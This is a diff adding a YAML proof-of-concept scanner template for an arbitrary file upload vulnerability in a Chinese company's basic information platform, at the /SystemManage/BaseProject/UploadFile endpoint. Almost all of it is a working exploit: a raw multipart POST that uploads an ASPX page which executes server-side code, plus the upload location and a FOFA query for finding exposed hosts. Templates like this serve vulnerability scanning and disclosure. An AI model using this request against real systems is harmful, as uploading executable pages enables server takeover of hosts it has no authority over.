@@ -1,0 +1,47 @@
+id: poc-fda8fxuevi7hargz
+info:
+  name: 武汉地大信息工程股份有限公司基础信息平台UploadFile 存在任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/fda8fxuevi7hargz'
+  tags: file-upload,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: fda8fxuevi7hargz
+    fofa: body="/SystemManage/BaseProject"
+http:
+- raw:
+  - 'POST /SystemManage/BaseProject/UploadFile HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0
+
+    Accept-Encoding: gzip, deflate
+
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary3eAFYzQhNgj7Q4xh
+
+    Cookie: ASP.NET_SessionId=3xa5xt4ordsw2seoftjsfrrl
+
+    Content-Length: 284
+
+
+    ------WebKitFormBoundary3eAFYzQhNgj7Q4xh
+
+    Content-Disposition: form-data; name="file"；filename="test.aspx"
+
+
+    <%@ Page Language="C#"%><% Response.Write("123456789"); System.IO.File.Delete(Server.MapPath(Request.Url.AbsolutePath)); %>
+
+    ------WebKitFormBoundary3eAFYzQhNgj7Q4xh--
+
+
+
+    上传定位：/Content/images/projectImage/test.aspx
+
+    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1727416147505-4bf495ab-24ca-42b3-8b75-9d297b12525b.png)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
